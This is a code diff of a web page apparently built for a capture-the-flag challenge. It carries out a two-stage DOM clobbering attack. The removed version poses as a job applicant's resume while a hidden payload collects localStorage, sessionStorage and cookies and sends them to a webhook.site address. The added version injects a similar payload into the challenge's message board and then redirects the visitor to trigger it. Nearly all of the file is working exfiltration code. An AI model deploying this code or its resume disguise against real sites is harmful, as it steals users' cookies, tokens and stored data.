@@ -1,165 +1,61 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Software Engineer Resume - John Doe</title>
+    <title>Two-Stage Job Clobbering Attack</title>
     <meta charset="UTF-8">
-    <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .section { margin-bottom: 20px; }
-        h1 { color: #2c3e50; }
-        h2 { color: #34495e; border-bottom: 2px solid #3498db; }
-    </style>
 </head>
 <body>
-    <!-- DOM Clobbering payload - 全面扫描版本 -->
-    <div id="utilsJS">
-        <div id="url">data:text/javascript,try{console.log('[COMPREHENSIVE] Script executing...');function scanStorage(){var data={};data.flag=localStorage.getItem('flag')||'';data.ls={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);data.ls[k]=localStorage.getItem(k);}data.ss={};try{for(var j=0;j<sessionStorage.length;j++){var sk=sessionStorage.key(j);data.ss[sk]=sessionStorage.getItem(sk);}}catch(e){}data.cookies=document.cookie||'';data.domain=window.location.hostname;data.url=window.location.href;return data;}var scanResult=scanStorage();console.log('[COMPREHENSIVE] Scan result:',scanResult);var img=new Image();img.src='https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag='+encodeURIComponent(scanResult.flag)+'&ls='+encodeURIComponent(JSON.stringify(scanResult.ls))+'&ss='+encodeURIComponent(JSON.stringify(scanResult.ss))+'&cookies='+encodeURIComponent(scanResult.cookies)+'&domain='+encodeURIComponent(scanResult.domain)+'&source=comprehensive&t='+Date.now();console.log('[COMPREHENSIVE] Data sent');}catch(e){console.error('[COMPREHENSIVE] Error:',e);}</div>
-    </div>
-
-    <div class="header">
-        <h1>John Doe</h1>
-        <p>Senior Software Engineer</p>
-        <p>Email: john.doe@email.com | Phone: (555) 123-4567</p>
-        <p>LinkedIn: linkedin.com/in/johndoe | GitHub: github.com/johndoe</p>
-    </div>
-
-    <div class="section">
-        <h2>Professional Summary</h2>
-        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies. Proven track record of delivering scalable web applications and leading development teams.</p>
-    </div>
-
-    <div class="section">
-        <h2>Technical Skills</h2>
-        <ul>
-            <li><strong>Languages:</strong> JavaScript, Python, Java, TypeScript, SQL</li>
-            <li><strong>Frontend:</strong> React, Vue.js, HTML5, CSS3, Bootstrap</li>
-            <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
-            <li><strong>Databases:</strong> PostgreSQL, MongoDB, Redis</li>
-            <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
-        </ul>
-    </div>
-
-    <div class="section">
-        <h2>Work Experience</h2>
-        <h3>Senior Software Engineer - TechCorp (2021-Present)</h3>
-        <ul>
-            <li>Led development of microservices architecture serving 1M+ users</li>
-            <li>Reduced application load time by 40% through optimization</li>
-            <li>Mentored junior developers and conducted code reviews</li>
-        </ul>
-    </div>
-
-    <div class="section">
-        <h2>Education</h2>
-        <p><strong>Bachelor of Science in Computer Science</strong><br>
-        University of Technology, 2019</p>
-    </div>
-
+    <h1>Software Engineer Resume - John Doe</h1>
+    <p>Preparing advanced attack...</p>
+    
     <script>
-        console.log('[INIT] Comprehensive attack page loaded');
-        console.log('[INIT] Current domain:', window.location.hostname);
-        console.log('[INIT] Current URL:', window.location.href);
+        console.log('[STAGE1] Two-stage attack initiated');
         
-        // 立即扫描当前域名的存储
-        function scanCurrentDomain() {
-            console.log('[SCAN] Scanning current domain storage...');
+        // 第一阶段：向挑战网站注入DOM Clobbering消息
+        async function injectDOMClobbering() {
+            console.log('[STAGE1] Injecting DOM Clobbering message...');
+            
             try {
-                const data = {
-                    flag: localStorage.getItem('flag') || '',
-                    ls: {},
-                    ss: {},
-                    cookies: document.cookie || '',
-                    domain: window.location.hostname,
-                    url: window.location.href
+                const payload = {
+                    name: 'utilsJS',
+                    message: '<div id="utilsJS"><div id="url">data:text/javascript,try{console.log("[ATTACK] DOM Clobbering executed!");var flag=localStorage.getItem("flag");var allLS={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);allLS[k]=localStorage.getItem(k);}var img=new Image();img.src="https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag="+encodeURIComponent(flag)+"&ls="+encodeURIComponent(JSON.stringify(allLS))+"&source=injected_dom&t="+Date.now();console.log("[ATTACK] Flag sent:",flag);}catch(e){console.error("[ATTACK] Error:",e);}</div></div>'
                 };
                 
-                // 扫描localStorage
-                for (let i = 0; i < localStorage.length; i++) {
-                    const k = localStorage.key(i);
-                    data.ls[k] = localStorage.getItem(k);
-                    console.log('[SCAN] localStorage:', k, '=', data.ls[k]);
-                }
+                const response = await fetch('https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/messages', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
                 
-                // 扫描sessionStorage
-                try {
-                    for (let j = 0; j < sessionStorage.length; j++) {
-                        const sk = sessionStorage.key(j);
-                        data.ss[sk] = sessionStorage.getItem(sk);
-                        console.log('[SCAN] sessionStorage:', sk, '=', data.ss[sk]);
-                    }
-                } catch (e) {}
+                console.log('[STAGE1] Injection response:', response.status);
                 
-                console.log('[SCAN] cookies:', data.cookies);
-                
-                // 发送扫描结果
+                // 发送注入成功信号
                 const img = new Image();
-                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag=' + encodeURIComponent(data.flag) + 
-                         '&ls=' + encodeURIComponent(JSON.stringify(data.ls)) + 
-                         '&ss=' + encodeURIComponent(JSON.stringify(data.ss)) + 
-                         '&cookies=' + encodeURIComponent(data.cookies) + 
-                         '&domain=' + encodeURIComponent(data.domain) + 
-                         '&scan_source=immediate&t=' + Date.now();
+                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=dom_injected&status=' + response.status + '&t=' + Date.now();
                 
-                console.log('[SCAN] Scan result sent');
-                return data;
             } catch (e) {
-                console.error('[SCAN] Error:', e);
-                return null;
+                console.error('[STAGE1] Injection failed:', e);
+                const img = new Image();
+                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=injection_failed&error=' + encodeURIComponent(e.message) + '&t=' + Date.now();
             }
         }
         
-        // 立即扫描
-        const initialScan = scanCurrentDomain();
+        // 立即执行注入
+        injectDOMClobbering();
         
-        // 发送页面加载信号
-        try {
+        // 第二阶段：跳转到挑战网站触发DOM Clobbering
+        setTimeout(() => {
+            console.log('[STAGE2] Redirecting to trigger DOM Clobbering...');
+            
+            // 发送跳转信号
             const img = new Image();
-            img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=comprehensive_loaded&domain=' + 
-                     encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
-        } catch (e) {}
-
-        // 如果在GitHub Pages，跳转到目标网站
-        if (window.location.hostname.includes('github.io')) {
-            console.log('[REDIRECT] On GitHub, will redirect to target...');
-            setTimeout(() => {
-                try {
-                    const img = new Image();
-                    img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=redirecting_from_github&t=' + Date.now();
-                } catch (e) {}
-                window.location.href = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/#messages';
-            }, 2000);
-        } else {
-            // 在目标网站上，再次扫描并尝试触发DOM Clobbering
-            console.log('[TARGET] On target site, performing additional scans...');
+            img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=stage2_redirect&t=' + Date.now();
             
-            // 延迟扫描（等待可能的异步数据加载）
-            setTimeout(() => {
-                console.log('[TARGET] Secondary scan...');
-                scanCurrentDomain();
-            }, 1000);
-            
-            // 尝试触发DOM Clobbering
-            setTimeout(() => {
-                console.log('[TARGET] Attempting to trigger DOM Clobbering...');
-                try {
-                    if (typeof loadMessageBoardJS === 'function') {
-                        console.log('[TARGET] loadMessageBoardJS found, calling...');
-                        loadMessageBoardJS();
-                    } else {
-                        console.log('[TARGET] loadMessageBoardJS not found, trying alternatives...');
-                        if (typeof getMessages === 'function') {
-                            getMessages();
-                        }
-                    }
-                } catch (e) {
-                    console.error('[TARGET] Error triggering:', e);
-                    const img = new Image();
-                    img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?error=trigger_error&msg=' + 
-                             encodeURIComponent(e.message) + '&t=' + Date.now();
-                }
-            }, 3000);
-        }
+            // 跳转到messages页面
+            window.location.href = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/#messages';
+        }, 2000);
     </script>
 </body>
 </html>
